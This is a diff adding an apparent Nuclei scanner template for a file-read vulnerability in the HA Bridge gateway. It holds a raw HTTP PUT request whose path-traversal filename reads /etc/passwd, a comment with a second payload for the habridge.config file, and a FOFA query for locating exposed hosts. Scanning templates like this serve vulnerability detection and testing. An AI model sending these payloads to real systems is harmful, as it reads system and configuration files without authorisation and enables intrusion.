@@ -1,0 +1,27 @@
+id: hi-bridge-route-download-filedown
+
+info:
+  name: hi-bridge-route-download-filedown
+  author: HackTwo
+  severity: high
+  description: hi-bridge 网关 download存在文件读取漏洞。
+  tags:  hi-bridge,filedown
+  metadata:
+    fofa-qeury: title="HA Bridge"
+
+http:
+  - raw:
+      - |              
+        PUT /api/devices/backup/download HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 
+
+        {"filename":"../../../../etc/passwd"}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body, "root:x") && contains(header, "text/html")'
+
+#读配置文件：{"filename":"../data/habridge.config"}
